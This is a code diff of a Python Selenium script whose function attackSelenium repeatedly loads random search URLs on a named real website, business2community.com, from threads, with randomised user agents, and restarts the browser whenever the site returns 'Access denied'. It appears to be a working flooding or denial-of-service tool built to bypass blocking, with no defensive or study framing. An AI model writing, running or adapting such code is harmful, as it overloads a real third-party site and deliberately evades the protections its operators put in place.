@@ -17,6 +17,7 @@ from selenium.webdriver.support.expected_conditions import presence_of_element_l
 from selenium.webdriver.common.by import By
 from random_user_agent.user_agent import UserAgent
 from random_user_agent.params import SoftwareName, OperatingSystem
+from selenium.webdriver.support import expected_conditions as EC
 
 software_names = [SoftwareName.CHROME.value]
 operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
@@ -330,8 +331,9 @@ def attackSelenium(baseUrl):
 	
 	while True:
 		try:
-			# url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(random.randint(11,30))) 
-			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
+			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(random.randint(11,30))) 
+			# url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(random.randint(11,30)))
+			# url = baseUrl
 			print(url)
 			driver.get(url)
 
@@ -385,6 +387,11 @@ def attackSelenium(baseUrl):
 
 			print(driver.title)
 
+			# for i in range(200):
+			# 	input = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 's')))
+			# 	input.send_keys(''.join(random.choice(letters) for i in range(random.randint(11,30))))
+			# 	time.sleep(100)
+
 			if driver.title == 'Access denied':
 				driver.close()
 				driver = get_driver()
@@ -395,7 +402,7 @@ def attackSelenium(baseUrl):
 			#input()
 
 
-for i in range(5):
+for i in range(1):
 	Thread(target=attackSelenium, args=['https://www.business2community.com']).start()
 input()
 
